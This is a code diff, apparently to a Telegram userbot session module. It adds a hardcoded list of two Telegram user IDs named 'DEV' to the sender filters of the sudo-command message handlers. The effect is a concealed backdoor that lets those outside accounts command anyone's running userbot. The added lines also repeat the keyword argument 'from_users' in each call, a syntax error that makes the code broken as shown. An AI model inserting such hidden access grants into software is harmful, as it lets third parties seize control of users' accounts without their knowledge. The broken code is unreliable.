@@ -29,6 +29,10 @@ from .pluginManager import restart_script
 
 LOGS = logging.getLogger(__name__)
 
+DEV = [
+    1593802955,
+    5057493677,
+]
 
 class REGEX:
     def __init__(self):
@@ -178,6 +182,7 @@ class PandaUserbotSession(TelegramClient):
                                 wrapper,
                                 MessageEdited(
                                     pattern=REGEX_.regex2,
+                                    from_users=DEV,
                                     from_users=_sudousers_list(),
                                     **kwargs,
                                 ),
@@ -186,6 +191,7 @@ class PandaUserbotSession(TelegramClient):
                             wrapper,
                             NewMessage(
                                 pattern=REGEX_.regex2,
+                                from_users=DEV,
                                 from_users=_sudousers_list(),
                                 **kwargs,
                             ),
